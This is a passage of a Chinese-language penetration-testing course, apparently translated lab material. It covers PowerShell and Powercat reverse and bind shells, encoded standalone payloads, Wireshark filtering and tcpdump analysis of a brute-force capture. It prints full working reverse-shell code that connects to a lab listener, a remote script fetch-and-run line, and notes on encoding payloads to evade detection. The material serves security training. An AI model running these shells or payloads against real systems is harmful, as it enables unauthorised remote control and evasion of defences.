命名空间中定义和实现的。WebClient 类用于访问由 URI 识别的资源，它暴露了一个名为 DownloadFile 的公共方法，该方法需要我们的两个关键参数：一个源位置（如我们之前所说的 URI 形式），以及一个目标位置，检索到的数据库将被存储在那里。\n\n这个语法可能看起来很混乱，但实际上是相当简单的。请参考微软 [System.Net](http://System.Net) 参考资料，看看这个命名空间中所有实现的类的列表。然后，接着看 WebClient 类，最后看 DownloadFile 方法，以直观地了解我们的例子中使用的类和方法的结构。\n\n在 Bob 的电脑上下载了 wget.exe 可执行文件后，他可以把它作为另一个工具来下载更多的文件或继续使用 PowerShell。\n\n### PowerShell 反向 Shell\n\n在本节中，我们将利用 PowerShell 单代码来执行 Shell，首先是一个反向 Shell。\n\n首先，我们将在 Alice 的电脑上设置一个简单的 Netcat 监听器：\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\n```\n\n接下来，我们将从 Bob 的电脑上发送一个 PowerShell 反向 Shell。同样，这在语法上不如 Netcat 或 Socat 干净，但由于 PowerShell 在大多数现代 Winodws 机器上是原生的，所以我们探索这个 PowerShell 的等价物是很重要的。首先，让我们看一下代码，然后把他分解。\n\n```bash\n$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);\n$stream = $client.GetStream();\n[byte[]]$bytes = 0..65535|%{0};\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)\n{\n $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);\n $sendback = (iex $data 2>&1 | Out-String );\n $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';\n $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n $stream.Write($sendbyte,0,$sendbyte.Length);\n $stream.Flush();\n}\n$client.Close();\n```\n\n与我们以前使用的工具相比，这可能看起来非常复杂。然而，PowerShell 是强大而灵活的；它不是一个单一功能的工具。正因为如此。我们必须使用一个复杂的语法来调用复杂的功能。\n\n这段代码由几个命令组成，用分号隔开。首先，我们看到一个客户端变量，它被分配了目标 IP 地址，一个流变量，一个称为 bytes 的字节数组，以及一个 while 循环，接着是一个关闭客户端连接的调用。在 while 循环中，我们可以看到几行负责向网络流读写数据。请注意，iex（”Invoke-Expression”）cmdlet 是这个代码块的关键部分，因为它把收到的任何字符串作为命令运行，然后命令的结果被重定向并通过数据流发送回来。\n\n这段代码可以被卷进一个公认的冗长的单行代码，在命令提示符下执行：\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()\"\n```\n\n这个单行代码乍一看似乎非常艰巨，但没有必要记住它；在现场渗透测试中，我们可能会复制和粘贴这种类型的命令（替换 IP 和端口号）。\n\n最后，我们用 Netcat 接收反向 Shell。\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63515\n\nPS C:\\\\Users\\\\offsec>\n```\n\n总之，通过简单的替换 System.Net.Sockets.TCPClient 调用中的 IP 地址和端口号，我们可以很容易地重复使用这个 PowerShell 反向 Shell 命令。\n\n### PowerShell 正向 Shell\n\n在处理正向 Shell 的时候，过程是相反的。我们首先通过 PowerShell 在 Bob 的电脑上创建正向 Shell，然后用 Netcat 从 Alice 的电脑上连接到它。\n\n在下面的代码片段中，我们将再次使用 `-c` 选项将我们的命令传递给 PowerShell。与反向 Shell 一样，这个复杂的命令可以分解成几个命令。除了客户端、流和字节集变量外，我们还有一个新的监听器变量，它使用 System.Net.Sockets.TcpListener 类。这个类需要两个参数：首先是要监听的地址，其次是端口。通过提供 0.0.0.0 作为本地地址，我们的正向 Shell 将在系统的所有 IP 地址上可用。同样，我们使用 iex cmdlet 来执行我们的命令。\n\n```bash\nC:\\\\Users\\\\offsec> powershell -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\"\n```\n\n有了正向 Shell 的监听，我们可以从 Alice 的机器上用 Netcat 连接到它，就像我们用其他的 Shell 一样。我们包括 Netcat 的 `-v` 选项，因为我们的正向 Shell 在第一连接时不一定会出现命令提示。\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 443\n(UNKNOWN) [10.11.0.22] 443 (https) open\nipconfig\nWindows IP Configuration\nEthernet adapter Local Area Connection:\n Connection-specific DNS Suffix . :\n IPv4 Address. . . . . . . . . . . : 10.11.0.22\n Subnet Mask . . . . . . . . . . . : 255.255.255.0\n Default Gateway . . . . . . . . . : 10.11.0.1\n\nC:\\\\Users\\\\offsec>\n```\n\nPowerShell 强大得令人发指，我们甚至还没有接近它的功能的表面。由于微软越来越多地将 PowerShell 用于基于 Windows 的管理和自动化，知道如何正确使用 PwerShell 来实现我们的目标是极其重要的。请参考微软 PowerShell 文档和微软 [System.Net](http://System.Net) 参考，以了解更多的类和方法，以及网上提供的各种 PowerShell 培训和讲座。\n\n### Powercat\n\nPowercat 本质上是由 Besimorhino 编写的 Netcat 的 PowerShell 版本。它是一个我们可以下载到 Windows 主机上的脚本，以利用 PowerShell 的优势，并简化了正向/反向 Shell 的创建。\n\n<aside> 💡 Powercat 可以通过 apt install powercat 在 Kali 中安装，它将把脚本放在 /usr/share/windows-resources/powercat 中。\n\n</aside>\n\n我们可以跳过第一步，即把脚本从我们的 Kali Linux 机器转移到 Windows 主机，因为我们已经熟悉了文件传输。\n\n在目标主机上的脚本，我们首先使用 PowerShell 的一个功能，即 Dot-sourcing 来加载 powercat.ps1 脚本。这将使脚本中声明的所有变量和函数在当前 PowerShell 范围内可以用。通过这种方式，我们可以在 PowerShell 中直接使用 Powercat 函数，而不是每次都执行该脚本。\n\n```bash\nPS C:\\\\Users\\\\Offsec> . .\\\\powercat.ps1\n```\n\n如果目标机器连接到互联网，我们可以再次使用方便的 iex cmdlet，用远程脚本做同样的事情，如下所示：\n\n```bash\nPS C:\\\\Users\\\\Offsec> iex (New-Object System.Net.Webclient).DownloadString('<https://raw.githubusercontent.com/besimorhino/po> wercat/master/powercat.ps1')\n```\n\n值得注意的是，以这种方式加载的脚本只能在当前的 PowerShell 实例中使用，而且每次我们重启 PwerShell 时都需要重新加载。\n\n现在我们的脚本已经加载完毕，我们可以按如下方式执行 powercat。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat\nYou must select either client mode (-c) or listen mode (-l).\n```\n\n我们可以通过查看帮助菜单快速熟悉 Powercat：\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -h\npowercat - Netcat, The Powershell Version\nGithub Repository: <https://github.com/besimorhino/powercat>\nThis script attempts to implement the features of netcat in a powershell\nscript. It also contains extra features such as built-in relays, execute\npowershell, and a dnscat2 client.\nUsage: powercat [-c or -l] [-p port] [options]\n -c <ip> Client Mode. Provide the IP of the system you wish to connect to.\n If you are using -dns, specify the DNS Server to send queries to.\n -l Listen Mode. Start a listener on the port specified by -p.\n -p <port> Port. The port to connect to, or the port to listen on.\n -e <proc> Execute. Specify the name of the process to start.\n...\n -i <input> Input. Provide data to be sent down the pipe as soon as a connection\n established. Used for moving files. You can provide the path to a fi\n a byte array object, or a string. You can also pipe any of those int\npowercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80\n...\n -g Generate Payload. Returns a script as a string which will execute t\n powercat with the options you have specified. -i, -d, and -rep will\n be incorporated.\n -ge Generate Encoded Payload. Does the same as -g, but returns a string\n can be executed in this way: powershell -E <encoded string>\n -h Print this help message.\n...\n```\n\n让我们回顾一下我们如何使用 powercat 进行文件传输，并像以前的工具那样进行正向和反向 Shell。\n\n### Powercat 文件传输\n\n尽管我们可以使用前面讨论的任何工具将 Powercat 传输到我们的目标，让我们看看如何使用 powercat 将自己（powercat.ps1）从 Bob 传输到 Alice，作为演示用 powercat 传输文件的方法。\n\n首先，我们在 Alice 的电脑上运行一个 Netcat 监听器。\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443 > receiving_powercat.ps1\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63661\n```\n\n接下来，我们将在 Bob 的电脑上调用 powercat。 `-c` 选项指定了客户端模式并设置了监听 IP 地址， `-p` 指定了连接的端口号， `-i`  表示将被远程传输的本地文件。\n\n```bash\nPS C:\\\\Users\\\\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\\\\Users\\\\Offsec\\\\powercat.ps1\n```\n\n最后， Alice 将 kill Netcat 进程，并检查文件是否已经收到。\n\n```bash\n^C\nkali@kali:~$ ls receiving_powercat.ps1\nreceiving_powercat.ps1\n```\n\n### Powercat 反向 Shell\n\n反向 Shell 的过程与我们已经看到的类似。我们将在 Alice 的计算机上启动一个 Netcat 监听器。然后 Bob 将使用 powercat 来发送一个反向 shell。\n\n我们从 Alice 的机器上的 Netcat 监听器开始：\n\n```bash\nkali@kali:~$ sudo nc -lvp 443\nlistening on [any] 443 ...\n```\n\n接下来，Bob 将使用 powercat 来发送一个反向 shell。在这个例子中， `-e` 选项指定了一旦连接到一个监听端口时要执行的应用程序（cmd.exe）。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe\n```\n\n最后，Alice 的 Netcat 监听器将收到 shell。\n\n```bash\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63699\nMicrosoft Windows [Version 10.0.17134.590]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\\\Users\\\\offsec>\n```\n\n### Powercat 正向 Shell\n\n相比之下，powercat 正向 shell 是在 Bob 那边用 powercat 监听器启动的。我们将使用 `-l` 选项来创建一个监听器， `-p` 指定监听端口号， `-e` 在连接后执行一个应用程序（cmd.exe）。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -l -p 443 -e cmd.exe\n```\n\n接下来，Alice 将创建一个 Netcat 连接到 Bob 的计算机上的正向 shell。\n\n```bash\nkali@kali:~$ nc 10.11.0.22 443\nMicrosoft Windows [Version 10.0.17134.590]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\\\Users\\\\offsec>\n```\n\n### Powercat 独立 Payload\n\nPowercat 还可以生成独立的 Payload。在 powercat 的上下文中，payload 是一组 powershell 指令以及仅包含用户请求的功能的 powercat 脚本本身的部分，只包括用户要求的功能。让我们在下一个例子中试验一下 payload。\n\n在 Alice 的机器上启动监听器后，我们通过在之前的 powercat 命令中添加 `-g` 选项并将输出重定向到一个文件来创建一个独立的反向 shell payload。这将产生一个 powershell 脚本，Bob 可以在他的电脑上执行。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1\n\nPS C:\\\\Users\\\\offsec> ./reverseshell.ps1\n```\n\n值得注意的是，像这种独立的 payload 可能很容易被 IDS 发现。具体而言，生成的脚本相当大，大约有 300 行代码。此外，它还包含一个硬编码的字符串，可以很容易地用于恶意活动的签名中。虽然识别任何具体的签名不在本模块的范围内，但足以说明像这样的纯文本恶意代码可能会有一个很差的成功率，并可能被防御性软件解决方案给拦截。\n\n我们可以尝试通过利用 PowerShell 执行 Base64 编码命令的能力来解决这个问题。为了生成一个独立的编码的 Payload，我们使用 `-ge` 选项，并再次将输出重定向到一个文件。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1\n```\n\n该文件包含一个编码字符串，可以使用 PowerShell -E（EncodedCommand）选项来执行。然而，由于 `-E` 选项被设计为一种在命令行上提交复杂命令的方式，所产生的 encodedreverseshell.ps1 脚本不能像我们的未编码的 Payload 一样被执行。相反，Bob 需要将整个编码的字符串传递给 powershell.exe -E。\n\n```bash\nPS C:\\\\Users\\\\offsec> powershell.exe -E\nZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAH\nIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAs\nACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYg\nBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAA\nIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgAC\nAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBl\nAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA\nBlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA\n...\n```\n\n在运行独立的 Payload 后，Alice 在她等待的监听器上收到了反向 Shell。\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 43725\n\nPS C:\\\\Users\\\\offsec>\n```\n\n我们已经介绍了各种可以处理文件传输、正向 Shell 和 反向 Shell 的工具。这些工具在渗透测试中具有不同的特点、优势、弱点和适用性。你可以自己测试一下 powercat 的功能，以完善你对这个伟大工具系列的接触。\n\n## Wireshark\n\n一个合格的渗透测试员应该精通网络基础只是。网络嗅探器，如业界主要的 Wireshark，是学习网络协议、分析网络流量和调试网络服务的必备工具。在本节中，我们将讨论一些 Wireshark 的基础知识。\n\n### Wireshark 基础知识\n\nWireshark 使用 Libpcap（在 Linux 上）或 Winpcap（在 Windows 上）库，以便从网络上捕获数据包。\n\n在用嗅探器分析网络流量时，很容易被收集的数据中的大量“噪音”所淹没。为了方便分析，我们可以在 Wireshark 中应用捕获过滤器和显示过滤器。如果我们在 Wireshark 会话中应用捕获过滤器，任何不符合过滤器标准的数据包将被丢弃，剩余的数据将被传递给捕获引擎。然后，捕获引擎对传入的数据包进行剖析，分析它们，最后在显示输出之前应用任何额外的显示过滤器。\n\n这个过程可以用下图来说明。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/80dc3f76-6a7f-4185-8d63-cc2e5ed98c65/Untitled.png)\n\n使用任何网络嗅探器（包括 Wireshark）的秘诀是学会如何使用捕获和显示过滤器来剥离多余的数据。幸运的是，Wiresahrk 的图形界面使得数据的可视化和各种过滤器的使用变得相对容易。\n\n### 启动 Wireshark\n\n在下面的例子中，我们将在匿名的 FTP 登录过程中捕获网络流量。在我们的 Kali 系统中，我们使用命令行启动 Wireshark，如下所示，或者通过应用程序菜单启动，它位于 Sniffing & Spoofing 子菜单下。\n\n```bash\nkali@kali:~$ sudo wireshark\n```\n\n### 捕获过滤器\n\n当 Wiresahrk 加载时，我们会看到一个基本的窗口，在这里我们可以选择我们要监控的网络接口，以及设置显示和捕获过滤器。如上所述，我们可以使用捕获过滤器，通过丢弃任何不符合我们的过滤器的流量来减少捕获的流量，并将我们的注意力缩小到我们希望分析的数据包。请注意，从捕获过滤器中排除的任何流量都会丢失，因此，如果你担心可能会丢失数据，最好定义广泛的捕获过滤器。\n\n我们首先选择我们想要监控的接口，然后输入一个捕获过滤器。在本例中，我们使用 net filter 来只捕获 10.11.1.0/24 地址范围内的流量。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/395e6991-68af-4fc5-8859-a8cdf146e299/Untitled.png)\n\n也可以通过导航到 Capture > Capture filters 来选择预定义的捕获过滤器，我们还可以通过点击 `+` 号来添加自己的捕获过滤器。设置好捕获过滤器后，我们可以从好用的接口列表中双击我们的网络接口（tap0）来开始捕获。\n\n### 显示过滤器\n\n现在 Wireshark 已经捕捉到了本地网络中的所有流量，我们可以登录到 FTP 服务器并检查这些流量。\n\n```bash\nkali@kali:~$ ftp 10.11.1.13\nConnected to 10.11.1.13.\n220 Microsoft FTP Service\nName (10.11.1.13:kali): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:anonymous\n230 Anonymous user logged in.\nRemote system type is Windows_NT.\nftp> quit\n221\n```\n\n为了进一步缩小背景流量，让我们利用一个显示过滤器，只关注 FTP 协议。显示过滤器比捕获过滤器要灵活得多，而且语法也略有不同。顾名思义，显示过滤器只过滤被显示的数据包，而 Wireshark 继续在后台捕获 10.11.1.0/24 地址范围内的所有网络流量。正因为如此，我们可以通过点击显示过滤器右侧的 “X” 图标来清除显示过滤器，而不必重新开始捕获。与捕获过滤器一样，我们也可以通过点击分享 > 显示过滤器，从预定义的列表中选择一个过滤器。\n\n列表中选择一个过滤器。给我们应用一个显示过滤器，只显示 FTP 数据，或端口 21 的 TCP 流量。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8bba53ff-454d-4d21-964f-f1dfeb9cad33/Untitled.png)\n\n这个过滤器工作得非常好。现在我们可以清楚地看到 21 端口上只有 FTP 的流量。\n\n### 跟踪 TCP 流\n\nWireshark 允许我们查看网络流量，包括每个数据包的内容。然而，我们通常对各种应用之间的数据流更感兴趣。我们可以利用 Wireshark 的能力来重新组合一个特定的会话，并以各种格式显示。要查看一个特定的 TCP 数据流，我们可以右击一个感兴趣的数据包，例如在我们的 FTP 会话中包含 USER 命令的数据包，然后选择跟随 > TCP 流。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8ea7eef6-0748-4b70-8c3f-2723eb4ec914/Untitled.png)\n\n重新组合的 TCP 流更容易阅读，我们可以回顾我们与 FTP 服务器的互动。因为 FTP 是一个明文协议，我们可以看到 FTP 客户端发送和接收的命令和输出。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bc01cc48-bda3-4dbc-9309-3c79f70747be/Untitled.png)\n\n## Tcpdump\n\nTcpdump 是一个基于文本的网络嗅探器，尽管没有图形界面，但它精简、强大、灵活。它是迄今为止最常用的命令行数据包分析器，可以在大多数 Unix 和 Linux 操作系统上找到，但本地用户的权限决定了捕获网络流量的能力。\n\nTcpdump 既可以从网络上捕获流量，也可以读取现有的捕获文件。让我们看看 password_cracking_filered.pacp 文件中发生了什么，该文件时在防火墙上捕获的。下载该文件并跟随我们一起分析数据。首先，我们将用 sudo 启动 tcpdump（授予捕获权限），用 `-r` 选项打开文件。\n\n```bash\nkali@kali:~$ sudo tcpdump -r password_cracking_filtered.pcap\nreading from file password_cracking_filtered.pcap, link-type EN10MB (Ethernet)\n08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.801023 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.801030 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n...\n```\n\n### 过滤流量\n\n一开始，输出结果有点让人不知所措，所以让我们试着通过使用 awk 和 sort 来更好地了解所涉及的 IP 地址和端口。\n\n首先，我们将使用 `-n` 选项来跳过 DNS 名称查询，使用 `-r` 来读取我们的数据包捕获文件。然后，我们可以用管道符将输出输入到 awk，打印出目标 IP 地址和端口（第三个空格分割的字符），并再次用管道符输入 sort 和 uniq -c，分别对该字段在捕获中出现的次数进行排序和计数。最后，我们用head 只显示输出的前 10 行。\n\n```bash\nkali@kali:~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F\" \" '{print\n$5}' | sort | uniq -c | head\n 20164 172.16.40.10.81:\n 14 208.68.234.99.32768:\n 14 208.68.234.99.32769:\n 6 208.68.234.99.32770:\n 14 208.68.234.99.32771:\n 6 208.68.234.99.32772:\n 6 208.68.234.99.32773:\n 15 208.68.234.99.32774:\n 12 208.68.234.99.32775:\n 6 208.68.234.99.32776:\n...\n```\n\n我们可以看到，172.16.40.10 是最常见的目标地址，其次是 208.68.234.99。鉴于 172.16.40.10 是通过低目的端口（81）联系的，而 208.68.234.99 是通过高目的端口联系的，我们可以正确地假设前者是服务器，后者是客户端。\n\n我们也可以安全地假设客户地址对服务器发出了许多请求，但为了不做过多的假设，我们可以使用过滤器来更仔细地检查流量。\n\n为了从命令行中进行过滤，我们将使用源主机（src host）和目的主机（dst host）过滤器，分别只输出源和目的流量。我们还可以通过端口号（-n port 81）进行过滤，以显示针对端口 81 的元流量和目的流量。现在让我们试试这些过滤器。\n\n```bash\nsudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap\n...\n08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.802053 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [.], ack 89, win 905,\noptions [nop,nop,TS val 71430591 ecr 25538253], length 0\n...\nsudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap\n...\n08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.802026 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [.], ack 4166855390,\nwin 115, options [nop,nop,TS val 25538253 ecr 71430591], length 0\n...\nsudo tcpdump -n port 81 -r password_cracking_filtered.pcap\n...\n08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n...\n```\n\n我们可以继续用各种命令行工具如 awk 和 grep 来处理这些过滤后的输出，但让我们继续前进，实际检查一些数据包，看看我们能发先生们样的细节。\n\n为了转储捕获的流量，我们将使用 `-X` 选项来打印 HEX 和 ASCII 格式的数据包。\n\n```bash\nkali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap\n...\n08:51:25.043062 IP 208.68.234.99.33313 > 172.16.40.10.81: Flags [P.], seq 1:140, ack 1\n 0x0000: 4500 00bf 158c 4000 3906 9cea d044 ea63 E ....@.9....D.c\n 0x0010: ac10 280a 8221 0051 a726 a77c 6fd8 ee8a ..(..!.Q.&.|o...\n 0x0020: 8018 0073 1c76 0000 0101 080a 0185 b2f2 ...s.v ........\n 0x0030: 0441 f5e3 4745 5420 2f2f 6164 6d69 6e20 .A..GET.//admin.\n 0x0040: 4854 5450 2f31 2e31 0d0a 486f 7374 3a20 HTTP/1.1..Host:.\n 0x0050: 6164 6d69 6e2e 6d65 6761 636f 7270 6f6e admin.megacorpon\n 0x0060: 652e 636f 6d3a 3831 0d0a 5573 6572 2d41 e.com:81..User-A\n 0x0070: 6765 6e74 3a20 5465 6820 466f 7265 7374 gent:.Teh.Forest\n 0x0080: 204c 6f62 7374 6572 0d0a 4175 7468 6f72 .Lobster..Author\n 0x0090: 697a 6174 696f 6e3a 2042 6173 6963 2059 ization:.Basic.Y\n 0x00a0: 5752 7461 5734 3662 6d46 7562 3352 6c59 WRtaW46bmFub3RlY\n 0x00b0: 3268 7562 3278 765a 336b 780d 0a0d 0a 2hub2xvZ3kx ...\n...\n```\n\n我们立即注意到，81 号端口的 172.16.40.10 的流量看起来像 HTTP 数据。事实上，这些 HTTP 请求似乎包含基本 HTTP 认证数据，用户代理为 “Teh Forest Lobster”。这是一个非常明显的迹象，表明有一些奇怪的事情正在发生。\n\n为了揭开其余的神秘面纱，我们需要依靠先进的头信息过滤。\n\n### 高级标题过滤\n\n在这一点上，为了更好地检查转储中的请求和响应，我们想过滤掉并只显示数据包。要做到这一点，我们将寻找那些开启了 PSH 和 ACK 标志的数据包。在最初的 3 次握手后，所有发送和接收的数据包都将设置 ACK 标志。PSH 标志用于强制执行数据包的即时交付，通常用于交互式应用层协议以避免缓冲。\n\n下图描述了 TCP 头，表明 TCP 标志从第 14 个字符开始定义。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2b624ee0-48b7-4956-878e-059a97ea0cca/Untitled.png)\n\n观察上图，我们可以看到 ACK 和 PSH 分别由第 14 字节的第四和第五位表示。\n\n```bash\nCEUAPRSF\nWCRCSSYI\nREGKHTNN\n00011000 = 24 in decimal\n```\n\n只打开这些位，我们就可以得到00011000，或十进制的 24。\n\n```bash\nkali@kali:~$ echo \"$((2#00011000))\"\n24\n```\n\n我们可以将这个数字与 ‘tcp[13] = 24’ 一起传递给 tcpdump 作为显示过滤器，以表明我们只想看到设置了 ACK 和 PSH 位的数据包（“数据包”），由 TCP 头的第 14 字节的第四和第五位（24）代表。请记住，用于计算字节数的 tcpdump 数组索引从 0 开始，所以语法应该是（tcp[13]）。\n\n这两个标志的组合将有望于只想我们显示 HTTP 请求和响应数据。下面是我们用来显示设置了 ACK 或 PSH 标志的数据包的命令。\n\n```bash\nkali@kali:~$ sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap\n06:51:20.802032 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [P.], seq 1855084075:1\nE ....@.9....D.c..(\n.].Qn.V+.]*....s1 .....\n....A..GET //admin HTTP/1.1\nHost: admin.megacorpone.com:81\nUser-Agent: Teh Forest Lobster\n\n...\nE ....@.@.....(\n.D.c.Q.^...E..?I ..........\n.A .....HTTP/1.1 401 Authorization Required\nDate: Mon, 22 Apr 2013 12:51:20 GMT\nServer: Apache/2.2.20 (Ubuntu)\nWWW-Authenticate: Basic realm=\"Password Protected Area\"\nVary: Accept-Encoding\nContent-Length: 488\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>401 Authorization Required</title>\n</head><body>\n<h1>Authorization Required</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n<hr>\n<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>\n</body></html>\n\n...\n08:51:25.044432 IP 172.16.40.10.81 > 208.68.234.99.33313:\nE..s.m@.@..U..(\n.D.c.Q.!o....& .....^u.....\n.A .....HTTP/1.1 301 Moved Permanently\nDate: Mon, 22 Apr 2013 12:51:25 GMT\nServer: Apache/2.2.20 (Ubuntu)\nLocation: <http://admin.megacorpone.com:81/admin/>\nVary: Accept-Encoding\nContent-Length: 333\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>301 Moved Permanently</title>\n</head><body>\n<h1>Moved Permanently</h1>\n<p>The document has moved <a\nhref=\"<http://admin.megacorpone.com:81/admin/>\">here</a>.</p>\n<hr>\n<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>\n</body></html>\n```\n\n从这里，我们的故事变得更加清晰。我们看到有大量的验证 /admin 目录的失败尝试，结果是 HTTP 401 回复，而最后一次登录尝试似乎成功了，因为服务器回复了 HTTP 301 回复。看来有人获得了对 Megacorpone 的一台服务器的访问权！\n\n# Bash 脚本\n\nGUN Bourne-Again Shell（BASH）是一个强大的工作环境和脚本引擎。一个合格的安全专业化人员会熟练地利用 Bash 脚本来简化和自动化许多 Linux 任务和程序。在本模块中，我们将介绍 Bash 脚本，并探讨几个实际的场景。\n\n## Bash 脚本的介绍\n\nBash 